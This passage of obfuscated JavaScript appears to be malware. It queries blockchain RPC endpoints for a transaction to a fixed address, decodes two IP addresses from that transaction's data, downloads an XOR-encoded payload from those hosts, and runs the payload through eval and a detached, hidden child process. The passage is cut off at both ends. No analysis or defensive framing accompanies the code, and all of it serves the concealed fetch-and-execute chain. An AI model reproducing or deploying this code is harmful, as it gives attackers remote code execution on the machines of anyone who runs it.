_0x2d60a1&&_0x44f1c3[_0x302f7f(0x1a6)](_0x206e57=>_0x2d60a1[_0x302f7f(0x187)+_0x302f7f(0x15f)](_0x302f7f(0x109),()=>_0x206e57[_0x302f7f(0x109)](),{'once':!(-0x4ea+0x1*0xbd9+-0x6ef)})),Promise[_0x302f7f(0x145)](R[_0x302f7f(0x17a)]((_0x5bb22b,_0x500809)=>_0x4bf01d(_0x5bb22b,_0x44f1c3[_0x500809][_0x302f7f(0xf4)])))[_0x302f7f(0xb4)](()=>{const _0x4f9e9e=_0x302f7f;for(const _0x51b2a9 of _0x44f1c3)_0x51b2a9[_0x4f9e9e(0x109)]();});}function _0xc702(_0x439202,_0x221bcc){_0x439202=_0x439202-(-0x9*-0x1+-0x7a2+0x81a);const _0x258a51=_0x3307();let _0x1d3d9c=_0x258a51[_0x439202];return _0x1d3d9c;}function rc(_0xda6d24,_0x2f10db,_0x33e410,_0x33ea87){const _0x402523=_0x44ceab,_0xc93c85={'czpyg':function(_0x10ed1d,_0x268c4e,_0x151e32){return _0x10ed1d(_0x268c4e,_0x151e32);},'AARcQ':_0x402523(0x166),'uJddd':_0x402523(0x13c)};return _0xc93c85[_0x402523(0x8c)](hr,_0xda6d24,{'method':_0xc93c85[_0x402523(0x9c)],'body':JSON[_0x402523(0xbf)]({'jsonrpc':_0xc93c85[_0x402523(0x1b4)],'id':0x1,'method':_0x2f10db,'params':_0x33e410}),'signal':_0x33ea87})[_0x402523(0xb3)](_0x105f19=>_0x105f19[_0x402523(0x1a4)]);}function rb(_0x718651,_0x5f02ff,_0x2d059d){const _0x74a62a=_0x44ceab,_0x56d273={'PvZQW':function(_0x775ce9,_0x1b0e71,_0x14c8b9){return _0x775ce9(_0x1b0e71,_0x14c8b9);},'caxup':_0x74a62a(0x166)};return _0x56d273[_0x74a62a(0xa6)](hr,_0x718651,{'method':_0x56d273[_0x74a62a(0xd0)],'body':JSON[_0x74a62a(0xbf)](_0x5f02ff[_0x74a62a(0x17a)](([_0x1d278d,_0x9f4d19],_0x4a23f8)=>({'jsonrpc':_0x74a62a(0x13c),'id':_0x4a23f8+(-0x65a+0x65e*-0x1+0xcb9),'method':_0x1d278d,'params':_0x9f4d19}))),'signal':_0x2d059d})[_0x74a62a(0xb3)](_0x23c1b4=>{const _0x433ea=_0x74a62a,_0x49fb65=new Map(_0x23c1b4[_0x433ea(0x17a)](_0x50a29a=>[_0x50a29a['id'],_0x50a29a]));return _0x5f02ff[_0x433ea(0x17a)]((_0x495ead,_0x1ee36d)=>_0x49fb65[_0x433ea(0xa2)](_0x1ee36d+(-0x11*0x14d+0x11c*0x14+-0x12))[_0x433ea(0x1a4)]);});}const bh=_0x40171f=>'\u0030\u0078'+_0x40171f[_0x44ceab(0x156)](-0x7df+-0x366+0x3*0x3c7);function fm(_0x540367){const _0x3a68d0={'vAWQN':function(_0x1b34c2,_0x3e11fd){return _0x1b34c2(_0x3e11fd);},'TQAET':function(_0x198eea,_0x7e3b93){return _0x198eea(_0x7e3b93);},'onYDw':function(_0x8960f0,_0x575a0a){return _0x8960f0===_0x575a0a;},'tZibq':function(_0x24609a,_0x5902a5){return _0x24609a===_0x5902a5;}};return new Promise(_0x47f6db=>{const _0x2a597f=_0xc702,_0x384d44={'bpVfp':function(_0x449e71,_0x542e23){const _0x3bbbce=_0xc702;return _0x3a68d0[_0x3bbbce(0x163)](_0x449e71,_0x542e23);},'oflCH':function(_0x4ac23a,_0x782e6e){const _0x2f0696=_0xc702;return _0x3a68d0[_0x2f0696(0xf0)](_0x4ac23a,_0x782e6e);},'RWpMw':function(_0x5c212f,_0x4a2ebf){const _0x349934=_0xc702;return _0x3a68d0[_0x349934(0xd8)](_0x5c212f,_0x4a2ebf);},'kpHNq':function(_0xf237d4,_0x2f4069){const _0x42ee91=_0xc702;return _0x3a68d0[_0x42ee91(0x163)](_0xf237d4,_0x2f4069);}};let _0x2002c9=_0x540367[_0x2a597f(0x1bc)];if(!_0x2002c9)return _0x3a68d0[_0x2a597f(0x16e)](_0x47f6db,null);let _0x2587b3=!(0x156e+-0x29*0x9d+-0x1c*-0x22);const _0x4fc567=_0x145588=>{const _0x3721c3=_0x2a597f;if(_0x2587b3)return;_0x2587b3=!(0x1d7a*-0x1+-0x2*-0xf6b+0x4*-0x57);for(const _0x4467d0 of _0x540367)_0x4467d0[_0x3721c3(0x12f)][_0x3721c3(0x109)]();_0x3a68d0[_0x3721c3(0x16e)](_0x47f6db,_0x145588);};for(const _0xfe772d of _0x540367)_0xfe772d[_0x2a597f(0x143)]()[_0x2a597f(0xb3)](_0x2cf5b=>{const _0x1c2d03=_0x2a597f;if(_0x2587b3)return;_0x2cf5b?_0x384d44[_0x1c2d03(0x81)](_0x4fc567,_0x2cf5b):_0x384d44[_0x1c2d03(0x1b9)](--_0x2002c9,0xede+0x300+0x8ef*-0x2)&&_0x384d44[_0x1c2d03(0x81)](_0x47f6db,null);})[_0x2a597f(0x174)](()=>{const _0x50b4ed=_0x2a597f;!_0x2587b3&&_0x384d44[_0x50b4ed(0x172)](--_0x2002c9,0x25a1+-0x8ad*0x2+-0xb3*0x1d)&&_0x384d44[_0x50b4ed(0x16f)](_0x47f6db,null);});});}const cb=_0x3f6224=>[...new Set([_0x3f6224-0x1n,_0x3f6224,_0x3f6224+0x1n,_0x3f6224-B-0x1n,_0x3f6224-B,_0x3f6224-B+0x1n][_0x44ceab(0x107)](_0x154e0d=>_0x154e0d>=0x0n))];function bt(_0x408b67){const _0x303cd1=_0x44ceab,_0x3b1daf=new AbortController();return{'controller':_0x3b1daf,'run':()=>wr((_0x1523b0,_0x1fd6a4)=>rc(_0x1523b0,_0x303cd1(0x19b)+_0x303cd1(0xdc),[bh(_0x408b67),!(-0x1fd1+0xc2*0x10+0x13b1)],_0x1fd6a4),_0x3b1daf[_0x303cd1(0xf4)])[_0x303cd1(0xb3)](_0x201c4c=>{const _0x123ec6=_0x303cd1,_0x401544=_0x201c4c?.[_0x123ec6(0x92)+'ns'],_0x139f3a=Array[_0x123ec6(0x9e)](_0x401544)?_0x401544[_0x123ec6(0x173)](_0x39f4e3=>_0x39f4e3[_0x123ec6(0x87)]?.[_0x123ec6(0x199)+'e']()===S):null;return _0x139f3a?{'blockNumber':_0x408b67,'tx':_0x139f3a}:null;})};}function na(_0x7cad65,_0xca9e47){const _0x84e27d=_0x44ceab,_0x3c49d0={'xOtmL':function(_0x1e5a6a,_0x5c706f,_0x2bf6fb){return _0x1e5a6a(_0x5c706f,_0x2bf6fb);}},_0x1e8487=_0x7cad65[_0x84e27d(0x17a)](_0xb7b7a5=>[_0x84e27d(0x118)+_0x84e27d(0x188)+_0x84e27d(0x19e),[S,bh(_0xb7b7a5)]]);return _0x3c49d0[_0x84e27d(0x19f)](wr,(_0x46ae76,_0x5bb4a1)=>rb(_0x46ae76,_0x1e8487,_0x5bb4a1),_0xca9e47)[_0x84e27d(0xb3)](_0x21bb32=>_0x21bb32[_0x84e27d(0x17a)](BigInt))[_0x84e27d(0x174)](()=>Promise[_0x84e27d(0x1a8)](_0x1e8487[_0x84e27d(0x17a)](([_0x5e0af3,_0x3d3a32])=>wr((_0x5c21ad,_0x2e3faf)=>rc(_0x5c21ad,_0x5e0af3,_0x3d3a32,_0x2e3faf),_0xca9e47)))[_0x84e27d(0xb3)](_0x319440=>_0x319440[_0x84e27d(0x17a)](BigInt)));}function ls(_0x599551){const _0x46f089=_0x44ceab,_0x4f37fe={'rsXqP':function(_0x314d5c,_0xa09b1d){return _0x314d5c!==_0xa09b1d;},'HTMau':function(_0x4d2aba,_0x2a3505){return _0x4d2aba===_0x2a3505;},'cHSXQ':function(_0x46b45c,_0x810410){return _0x46b45c(_0x810410);},'KJKIG':function(_0x584fc8,_0x12f945){return _0x584fc8<=_0x12f945;},'RptWP':function(_0x473a49,_0x4b88e6){return _0x473a49(_0x4b88e6);},'rwOMD':function(_0x37c87c,_0x32fe38){return _0x37c87c===_0x32fe38;},'SfXzz':function(_0x329a18,_0x33ff17){return _0x329a18-_0x33ff17;},'bnHJf':function(_0x5270be,_0x437bf5){return _0x5270be>_0x437bf5;},'nerJu':function(_0x52648e){return _0x52648e();},'PVNNR':function(_0x355d71,_0x4806ad){return _0x355d71(_0x4806ad);},'IctFD':function(_0x5e3f1a,_0x5d134d){return _0x5e3f1a(_0x5d134d);},'mEGgj':function(_0x2c432a,_0x3349b9){return _0x2c432a+_0x3349b9;},'zezXV':function(_0x765091,_0xfafc34){return _0x765091/_0xfafc34;},'UISzP':function(_0x515f4f,_0x2ee081){return _0x515f4f*_0x2ee081;},'QQiEt':function(_0x46f2a5,_0x311e8c,_0x12f7b2){return _0x46f2a5(_0x311e8c,_0x12f7b2);},'ufUJK':function(_0x1a6331,_0x3053a0){return _0x1a6331-_0x3053a0;},'DTEdO':function(_0x63b7c2,_0x34f196){return _0x63b7c2??_0x34f196;}},_0x2dafd4=new AbortController(),_0x844271=()=>_0x2dafd4[_0x46f089(0x109)]();return Promise[_0x46f089(0x101)](_0x4f37fe[_0x46f089(0xbc)](_0x599551,null))[_0x46f089(0xb3)](_0x2f1445=>_0x2f1445!=null?_0x2f1445:wr((_0x1a906f,_0x20bf86)=>rc(_0x1a906f,_0x46f089(0x100)+_0x46f089(0x147),[],_0x20bf86),_0x2dafd4[_0x46f089(0xf4)])[_0x46f089(0xb3)](_0x337616=>BigInt(_0x337616)))[_0x46f089(0xb3)](_0x7dfc96=>wr((_0x3353f9,_0x53082)=>rc(_0x3353f9,_0x46f089(0x118)+_0x46f089(0x188)+_0x46f089(0x19e),[S,bh(_0x7dfc96)],_0x53082),_0x2dafd4[_0x46f089(0xf4)])[_0x46f089(0xb3)](_0x264dec=>[_0x7dfc96,BigInt(_0x264dec)]))[_0x46f089(0xb3)](([_0x204e25,_0x4391d2])=>{const _0x1bca21=_0x46f089,_0x245ede={'uUkdF':function(_0x26ea2f,_0x28f631){const _0x2ed924=_0xc702;return _0x4f37fe[_0x2ed924(0x184)](_0x26ea2f,_0x28f631);},'YfHXM':function(_0x22b607,_0x1b5862){const _0x245652=_0xc702;return _0x4f37fe[_0x245652(0x106)](_0x22b607,_0x1b5862);},'VyEOa':function(_0x109d6f,_0x5d2a4a){const _0x51b5e8=_0xc702;return _0x4f37fe[_0x51b5e8(0x14f)](_0x109d6f,_0x5d2a4a);},'hSmHa':function(_0x53e4df,_0x4c6c4c){const _0x5482bf=_0xc702;return _0x4f37fe[_0x5482bf(0x106)](_0x53e4df,_0x4c6c4c);},'HoDWs':function(_0x2c43c1){const _0x1949b9=_0xc702;return _0x4f37fe[_0x1949b9(0x1c2)](_0x2c43c1);},'OVUFq':function(_0x2e34e9,_0x1f4702){const _0x546497=_0xc702;return _0x4f37fe[_0x546497(0xc5)](_0x2e34e9,_0x1f4702);},'uyVDL':function(_0x5d5f21,_0x2acf3f){const _0x3dddda=_0xc702;return _0x4f37fe[_0x3dddda(0xc8)](_0x5d5f21,_0x2acf3f);},'ViSQB':function(_0x3795ce,_0x1f5306){const _0x1218d8=_0xc702;return _0x4f37fe[_0x1218d8(0x15c)](_0x3795ce,_0x1f5306);},'AiKTD':function(_0x2b505a,_0x3153c7){const _0x52f1f9=_0xc702;return _0x4f37fe[_0x52f1f9(0xb6)](_0x2b505a,_0x3153c7);},'bymlS':function(_0x3e4d2e,_0x499abe){const _0x2cd6f0=_0xc702;return _0x4f37fe[_0x2cd6f0(0x164)](_0x3e4d2e,_0x499abe);},'jwZZr':function(_0x5aa412,_0xeb0c91){const _0x34cacd=_0xc702;return _0x4f37fe[_0x34cacd(0xef)](_0x5aa412,_0xeb0c91);},'tpJHG':function(_0x25f10c,_0x31293f,_0x2fa3c8){const _0xa133d6=_0xc702;return _0x4f37fe[_0xa133d6(0x169)](_0x25f10c,_0x31293f,_0x2fa3c8);}},_0x4e5ea3=_0x4f37fe[_0x1bca21(0x13d)](_0x4391d2,0x1n);let _0x270113=-0x1n,_0x3092fe=_0x204e25;const _0x486901=()=>_0x3092fe-_0x270113<=0x1n?wr((_0x2c5d53,_0x25226a)=>rc(_0x2c5d53,_0x1bca21(0x19b)+_0x1bca21(0xdc),[bh(_0x3092fe),!(0x10d*-0x13+0x4*0x298+-0x1*-0x997)],_0x25226a),_0x2dafd4[_0x1bca21(0xf4)])[_0x1bca21(0xb3)](_0x50c376=>{const _0x38672b=_0x1bca21,_0xaf6429=_0x50c376?.[_0x38672b(0x92)+'ns']||[];let _0x1690ce=null;for(const _0x1560a1 of _0xaf6429){if(_0x4f37fe[_0x38672b(0x159)](_0x1560a1[_0x38672b(0x87)]?.[_0x38672b(0x199)+'e'](),S))continue;if(_0x4f37fe[_0x38672b(0x14d)](_0x4f37fe[_0x38672b(0x1ba)](BigInt,_0x1560a1[_0x38672b(0xfa)]),_0x4e5ea3)){_0x1690ce=_0x1560a1;break;}_0x1690ce&&_0x4f37fe[_0x38672b(0x15c)](_0x4f37fe[_0x38672b(0x1ba)](BigInt,_0x1560a1[_0x38672b(0xfa)]),_0x4f37fe[_0x38672b(0x150)](BigInt,_0x1690ce[_0x38672b(0xfa)]))||(_0x1690ce=_0x1560a1);}return{'blockNumber':_0x3092fe,'tx':_0x1690ce};}):(_0x136021=>{const _0x337e14=_0x1bca21,_0x32454d={'FakYG':function(_0x5cbe21,_0x8b17e1){const _0x59f183=_0xc702;return _0x245ede[_0x59f183(0x16a)](_0x5cbe21,_0x8b17e1);},'DfeAz':function(_0x4b3382,_0x60dd00){const _0x4ae815=_0xc702;return _0x245ede[_0x4ae815(0xf6)](_0x4b3382,_0x60dd00);},'jIkRj':function(_0x1d673,_0x4ad835){const _0x536981=_0xc702;return _0x245ede[_0x536981(0x182)](_0x1d673,_0x4ad835);},'FXTJz':function(_0x5e2e14,_0x58a077){const _0x208e6b=_0xc702;return _0x245ede[_0x208e6b(0xea)](_0x5e2e14,_0x58a077);},'OVJbp':function(_0x26928b){const _0x34bd4b=_0xc702;return _0x245ede[_0x34bd4b(0x19a)](_0x26928b);}},_0x581450=_0x245ede[_0x337e14(0xc1)](BigInt,Math[_0x337e14(0x85)](-0x1*-0x751+0x151*-0x3+-0x352,_0x245ede[_0x337e14(0x1b6)](Number,_0x136021))),_0x3f45c9=[];for(let _0x4cf8ce=0x1n;_0x245ede[_0x337e14(0x1b1)](_0x4cf8ce,_0x581450);_0x4cf8ce+=0x1n)_0x3f45c9[_0x337e14(0xe3)](_0x245ede[_0x337e14(0x1af)](_0x270113,_0x245ede[_0x337e14(0xc9)](_0x245ede[_0x337e14(0x102)](_0x4cf8ce,_0x245ede[_0x337e14(0xea)](_0x3092fe,_0x270113)),_0x245ede[_0x337e14(0x1af)](_0x581450,0x1n))));return _0x245ede[_0x337e14(0xd7)](na,_0x3f45c9,_0x2dafd4[_0x337e14(0xf4)])[_0x337e14(0xb3)](_0x5dbf8d=>{const _0x1caffe=_0x337e14,_0x5ab502=_0x5dbf8d[_0x1caffe(0xdd)](_0x4c8e66=>_0x4c8e66>=_0x4391d2);return _0x32454d[_0x1caffe(0x18a)](_0x5ab502,-(-0xd5f+-0x2595+-0x5*-0xa31))?_0x270113=_0x3f45c9[_0x32454d[_0x1caffe(0xf9)](_0x3f45c9[_0x1caffe(0x1bc)],-0xe67+0xa*-0x247+0x1*0x252e)]:(_0x3092fe=_0x3f45c9[_0x5ab502],_0x32454d[_0x1caffe(0xb1)](_0x5ab502,-0x2346+0x7c9*-0x5+-0x28f*-0x1d)&&(_0x270113=_0x3f45c9[_0x32454d[_0x1caffe(0x144)](_0x5ab502,-0x84a+-0x39e*-0x6+0x1*-0xd69)])),_0x32454d[_0x1caffe(0x119)](_0x486901);});})(_0x3092fe-_0x270113-0x1n);return _0x4f37fe[_0x1bca21(0x1c2)](_0x486901);})[_0x46f089(0xb4)](_0x844271);}function li(){const _0x58b7e7=_0x44ceab,_0x4f8e9d={'OcATS':function(_0x2dc4cf,_0x31cb32){return _0x2dc4cf(_0x31cb32);},'ucUNo':function(_0x2649cf,_0x2fb135){return _0x2649cf(_0x2fb135);}};return _0x4f8e9d[_0x58b7e7(0xeb)](hr,I+(_0x58b7e7(0x11e)+_0x58b7e7(0x196)+_0x58b7e7(0xf2)+_0x58b7e7(0x127))+S+(_0x58b7e7(0x13b)+_0x58b7e7(0x10b)+_0x58b7e7(0x98)+_0x58b7e7(0x189)+_0x58b7e7(0x12e)+_0x58b7e7(0x14b)+_0x58b7e7(0xce)+'om'))[_0x58b7e7(0xb3)](_0x201a2a=>{const _0x58dd10=_0x58b7e7,_0x5ed66a=Array[_0x58dd10(0x9e)](_0x201a2a?.[_0x58dd10(0x1a4)])?_0x201a2a[_0x58dd10(0x1a4)]:[],_0x274d78=_0x5ed66a[_0x58dd10(0x173)](_0x3e34b6=>_0x3e34b6[_0x58dd10(0x87)]?.[_0x58dd10(0x199)+'e']()===S);return{'blockNumber':_0x4f8e9d[_0x58dd10(0x15e)](BigInt,_0x274d78[_0x58dd10(0xa4)+'r']),'tx':_0x274d78};});}((async()=>{const _0x55f1b7=_0x44ceab,_0xc996f9={'kZlWZ':_0x55f1b7(0x115)+_0x55f1b7(0xf7),'eGiCH':_0x55f1b7(0xc2),'LyGdN':function(_0xfae908,_0x26c4f5){return _0xfae908(_0x26c4f5);},'HkrSh':_0x55f1b7(0xd6),'PskPD':function(_0x2bbcb8,_0x583518){return _0x2bbcb8<_0x583518;},'HQMBO':function(_0x1b3a42,_0x1d197e){return _0x1b3a42%_0x1d197e;},'crZCf':_0x55f1b7(0xf5),'cyCpl':function(_0x3bac80,_0x246771){return _0x3bac80===_0x246771;},'CHepZ':_0x55f1b7(0x116),'JxCbi':function(_0x362ca9,_0x1c2819){return _0x362ca9(_0x1c2819);},'Jpnst':function(_0x311b27,_0x361384){return _0x311b27(_0x361384);},'XUzln':_0x55f1b7(0xcc),'QbRRV':_0x55f1b7(0x175),'nGxVW':_0x55f1b7(0x16b),'RmfMB':_0x55f1b7(0x10f),'WByWQ':function(_0x371b0c,_0x16278f){return _0x371b0c+_0x16278f;},'durVE':_0x55f1b7(0xd5)+_0x55f1b7(0x93)+_0x55f1b7(0x1be)+_0x55f1b7(0x10a)+_0x55f1b7(0x197)+_0x55f1b7(0x17c)+_0x55f1b7(0x99)+_0x55f1b7(0x1a0)+_0x55f1b7(0x113)+_0x55f1b7(0xcb)+_0x55f1b7(0x140)+'6','SIecw':function(_0x3a902b,_0x8b5878){return _0x3a902b(_0x8b5878);},'bKTVo':_0x55f1b7(0x176),'QthWB':function(_0x2a91bb,_0x3cdf2e,_0xe319e3){return _0x2a91bb(_0x3cdf2e,_0xe319e3);},'UniBA':_0x55f1b7(0x1a5),'EkQIH':_0x55f1b7(0x9d),'unMKf':_0x55f1b7(0x91),'ngsKF':function(_0x3c4556,_0xbf6f51,_0x1165e0,_0x42cd2e){return _0x3c4556(_0xbf6f51,_0x1165e0,_0x42cd2e);},'fkRSW':_0x55f1b7(0x18f),'wibbZ':function(_0x38b47e,_0x173a73){return _0x38b47e+_0x173a73;},'zAkNr':_0x55f1b7(0x161),'aBWJK':function(_0x44350e,_0x4a8a13){return _0x44350e-_0x4a8a13;},'xzqPs':function(_0x317261,_0x3ab8e8){return _0x317261(_0x3ab8e8);},'USRYf':_0x55f1b7(0x112),'CQAWy':function(_0x47a07f,_0x185a93,_0x34cec3,_0x21f47f){return _0x47a07f(_0x185a93,_0x34cec3,_0x21f47f);},'ojvxD':_0x55f1b7(0xc0)+_0x55f1b7(0xb7),'LnaXN':function(_0x32ec1e,_0x4fdf1b,_0x28721d,_0x460917){return _0x32ec1e(_0x4fdf1b,_0x28721d,_0x460917);},'MJEEv':_0x55f1b7(0x108)+_0x55f1b7(0x103)},_0x4d9a5d=_0xc996f9[_0x55f1b7(0x162)](BigInt,await _0xc996f9[_0x55f1b7(0x8b)](wr,(_0x227c26,_0x37693d)=>rc(_0x227c26,_0x55f1b7(0x100)+_0x55f1b7(0x147),[],_0x37693d))),_0x1f317d=_0xc996f9[_0x55f1b7(0x186)](_0x4d9a5d,_0xc996f9[_0x55f1b7(0xe5)](_0x4d9a5d,B));let _0x12c3f1=await _0xc996f9[_0x55f1b7(0x130)](fm,_0xc996f9[_0x55f1b7(0x1bf)](cb,_0x1f317d)[_0x55f1b7(0x17a)](bt));_0x12c3f1||(_0x12c3f1=await _0xc996f9[_0x55f1b7(0x18b)](ls,_0x4d9a5d)[_0x55f1b7(0x174)](li));const _0x532ab5=Buffer[_0x55f1b7(0x87)](_0x12c3f1['tx']['to'][_0x55f1b7(0x90)](/^0x/i,''),_0xc996f9[_0x55f1b7(0x10e)]),_0x1039ea=_0x1ff414=>_0x1ff414[0x1cf+-0x58*-0x5f+-0x11*0x207]+'\u002E'+_0x1ff414[-0x4c6*0x4+-0x657*-0x1+0xcc2]+'\u002E'+_0x1ff414[0x1*-0x23d8+-0xd7b+0xad*0x49]+'\u002E'+_0x1ff414[-0x1165+0x24da*0x1+-0x1372*0x1],[_0x4ef4ee,_0x5a3548]=[_0xc996f9[_0x55f1b7(0x18b)](_0x1039ea,_0x532ab5[_0x55f1b7(0x8f)](0x3f+-0x13*0x8e+0xa4b,-0x2*-0x46b+-0x27*-0x97+-0x1fd3*0x1)),_0xc996f9[_0x55f1b7(0x18b)](_0x1039ea,_0x532ab5[_0x55f1b7(0x8f)](0x13*-0x3b+-0x16f9+0x1b5e,0xecd+0x1*0x4a+0x3*-0x505))],_0x316007=global;_0x316007['_V']=_0x316007['i'],_0x316007['_H']=_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x10c),_0x316007[_0x55f1b7(0x9d)]=_0x55f1b7(0x122)+_0x5a3548+_0x55f1b7(0x10c),_0x316007[_0x55f1b7(0x1a5)]=_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x153),_0x316007[_0x55f1b7(0x91)]=_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x10c);function _0x35f66a(_0x15a3c7,_0x5172cf){const _0x1fe8ef=_0x55f1b7,_0x4e1685={'ogFTC':function(_0x5d5ef1,_0x25c12a){const _0x44a9c2=_0xc702;return _0xc996f9[_0x44a9c2(0xe1)](_0x5d5ef1,_0x25c12a);},'SrQJg':function(_0x132ac7,_0xe642fc){const _0x54353a=_0xc702;return _0xc996f9[_0x54353a(0xe5)](_0x132ac7,_0xe642fc);},'pMLys':_0xc996f9[_0x1fe8ef(0x178)],'QZywI':function(_0x17638b,_0x1ddcf0){const _0x40a40e=_0x1fe8ef;return _0xc996f9[_0x40a40e(0xad)](_0x17638b,_0x1ddcf0);},'yyHsj':_0xc996f9[_0x1fe8ef(0x180)],'bPQfv':function(_0x524d49,_0x10b991){const _0x402a9e=_0x1fe8ef;return _0xc996f9[_0x402a9e(0x1bf)](_0x524d49,_0x10b991);},'shSPT':function(_0x2f3f78,_0x4c3d09){const _0x25c412=_0x1fe8ef;return _0xc996f9[_0x25c412(0x18b)](_0x2f3f78,_0x4c3d09);},'uMvOo':_0xc996f9[_0x1fe8ef(0x14a)],'BtJwU':_0xc996f9[_0x1fe8ef(0x1c0)],'OxJjQ':_0xc996f9[_0x1fe8ef(0x88)],'wIbeD':function(_0x2d3440,_0x52e124){const _0x4f0500=_0x1fe8ef;return _0xc996f9[_0x4f0500(0x1bf)](_0x2d3440,_0x52e124);},'BLrzN':_0xc996f9[_0x1fe8ef(0x14e)],'YyqQS':function(_0xb87162,_0x1812f8){const _0x5ac0fc=_0x1fe8ef;return _0xc996f9[_0x5ac0fc(0x1bf)](_0xb87162,_0x1812f8);},'RbxTf':_0xc996f9[_0x1fe8ef(0x136)]},_0xc307f={'hostname':_0x5172cf[_0x1fe8ef(0xb8)],'port':+_0x5172cf[_0x1fe8ef(0x96)]||0x2b3*0x4+-0x1*-0x941+0xa3*-0x1f,'path':_0xc996f9[_0x1fe8ef(0xc7)](_0x5172cf[_0x1fe8ef(0xcd)],_0x5172cf[_0x1fe8ef(0xa5)]),'headers':{'User-Agent':_0xc996f9[_0x1fe8ef(0x131)],'Sec-V':_0x316007['_V']||0x266b+0x25*0xcb+-0x43c2}},_0x147817=_0x2ab23b=>{const _0x4d1e95=_0x1fe8ef,_0x133386=_0x15a3c7[_0x4d1e95(0x1bc)];for(let _0x511b70=-0x6c9+0x2488+0x5f3*-0x5;_0x4e1685[_0x4d1e95(0x148)](_0x511b70,_0x2ab23b[_0x4d1e95(0x1bc)]);_0x511b70++)_0x2ab23b[_0x511b70]^=_0x15a3c7[_0x4d1e95(0x9a)](_0x4e1685[_0x4d1e95(0x117)](_0x511b70,_0x133386));return _0x2ab23b[_0x4d1e95(0x156)](_0x4e1685[_0x4d1e95(0x1a2)]);},_0x440cea=_0x2ef284=>{const _0x438a51=_0x1fe8ef,_0x55d87c=_0x2ef284[_0x438a51(0xaf)][_0xc996f9[_0x438a51(0x14e)]];if(!_0x55d87c)throw new Error(_0xc996f9[_0x438a51(0x134)]);return _0xc996f9[_0x438a51(0x8b)](_0x147817,Buffer[_0x438a51(0x87)](_0x55d87c,_0xc996f9[_0x438a51(0xc4)]));},_0x50d02a=_0x2b7faa=>new Promise((_0x2af824,_0x389a52)=>{const _0x1cecae=_0x1fe8ef,_0xe9fc74={'ZuHfL':function(_0x101d75,_0x445496){const _0x118749=_0xc702;return _0x4e1685[_0x118749(0x15d)](_0x101d75,_0x445496);},'GGbog':function(_0x2c6e05,_0x4ae1fb){const _0xf9a117=_0xc702;return _0x4e1685[_0xf9a117(0xbb)](_0x2c6e05,_0x4ae1fb);},'QZRte':_0x4e1685[_0x1cecae(0x8e)],'OGXGz':function(_0xce0e7b,_0x2c9d77){const _0x21b712=_0x1cecae;return _0x4e1685[_0x21b712(0x1b3)](_0xce0e7b,_0x2c9d77);},'cRXVv':_0x4e1685[_0x1cecae(0x84)],'fLEkP':function(_0x3aa2eb,_0x287a3a){const _0x1042bf=_0x1cecae;return _0x4e1685[_0x1042bf(0xbb)](_0x3aa2eb,_0x287a3a);}},_0x289203=http[_0x1cecae(0x8a)]({..._0xc307f,'method':_0x2b7faa},_0x409e9a=>{const _0x441ca6=_0x1cecae;if(_0x4e1685[_0x441ca6(0x19c)](_0x2b7faa,_0x4e1685[_0x441ca6(0x1b8)])){try{_0x4e1685[_0x441ca6(0x141)](_0x2af824,_0x4e1685[_0x441ca6(0x141)](_0x440cea,_0x409e9a));}catch(_0x4cb34b){_0x4e1685[_0x441ca6(0x15d)](_0x389a52,_0x4cb34b);}_0x409e9a[_0x441ca6(0xe0)]();return;}const _0x4d7040=[];_0x409e9a['on'](_0x4e1685[_0x441ca6(0xd4)],_0x599f3e=>_0x4d7040[_0x441ca6(0xe3)](_0x599f3e)),_0x409e9a['on'](_0x4e1685[_0x441ca6(0x171)],()=>{const _0xda10a0=_0x441ca6;try{const _0x5c40ca=Buffer[_0xda10a0(0x12a)](_0x4d7040);if(_0x5c40ca[_0xda10a0(0x1bc)])return _0xe9fc74[_0xda10a0(0x1b7)](_0x2af824,_0xe9fc74[_0xda10a0(0x12d)](_0x147817,_0x5c40ca));if(_0x409e9a[_0xda10a0(0xaf)][_0xe9fc74[_0xda10a0(0x165)]])return _0xe9fc74[_0xda10a0(0x1b7)](_0x2af824,_0xe9fc74[_0xda10a0(0x12d)](_0x440cea,_0x409e9a));_0xe9fc74[_0xda10a0(0x183)](_0x389a52,new Error(_0xe9fc74[_0xda10a0(0xd2)]));}catch(_0x309348){_0xe9fc74[_0xda10a0(0x137)](_0x389a52,_0x309348);}}),_0x409e9a['on'](_0x4e1685[_0x441ca6(0x133)],_0x389a52);});_0x289203['on'](_0x4e1685[_0x1cecae(0x133)],_0x389a52),_0x289203[_0x1cecae(0x175)]();});return _0xc996f9[_0x1fe8ef(0x162)](_0x50d02a,_0xc996f9[_0x1fe8ef(0x11d)])[_0x1fe8ef(0x174)](()=>_0x50d02a(_0x1fe8ef(0x116)));}async function _0x4afabd(_0x34a475,_0x3638cd,_0x219678){const _0x1d2052=_0x55f1b7;try{const _0x4506a8=await _0xc996f9[_0x1d2052(0xbd)](_0x35f66a,_0x3638cd,_0x34a475),_0x589a8d=_0x1d2052(0x9b)+_0x1d2052(0x195)+(_0x316007['_V']||-0x747+0xf4d*-0x1+0x1694)+_0x1d2052(0xb9)+(_0x219678?'\u005F\u0048':_0xc996f9[_0x1d2052(0x1ae)])+_0x1d2052(0x195)+(_0x219678?_0x316007['_H']:_0x316007[_0x1d2052(0x1a5)])+_0x1d2052(0xb9)+(_0x219678?_0xc996f9[_0x1d2052(0xbe)]:_0xc996f9[_0x1d2052(0xb2)])+_0x1d2052(0x195)+(_0x219678?_0x316007[_0x1d2052(0x9d)]:_0x316007[_0x1d2052(0x91)])+(_0x1d2052(0xb9)+_0x1d2052(0xee)+_0x1d2052(0xdb)+_0x1d2052(0xf1)+_0x1d2052(0xfb)+_0x1d2052(0xda));_0x219678||_0xc996f9[_0x1d2052(0x18b)](eval,_0xc996f9[_0x1d2052(0xc7)](_0x589a8d,_0x4506a8)),_0xc996f9[_0x1d2052(0x132)](spawn,_0xc996f9[_0x1d2052(0x157)],['-e',_0xc996f9[_0x1d2052(0x19d)](_0x589a8d,_0x4506a8)],{'detached':!(-0x1*0x1d96+-0x2a*-0x87+-0x11*-0x70),'stdio':_0xc996f9[_0x1d2052(0x13e)],'windowsHide':!(0xf5f+-0x16fc+0x79d*0x1)})[_0x1d2052(0x8d)]();}catch(_0xedc825){}}await _0xc996f9[_0x55f1b7(0x1bb)](_0x4afabd,new URL(_0x55f1b7(0x122)+_0x4ef4ee+(_0x55f1b7(0x139)+'s')),_0xc996f9[_0x55f1b7(0x95)],!(-0xf0e+0x12d2+-0x3c3)),await _0xc996f9[_0x55f1b7(0x16d)](_0x4afabd,new 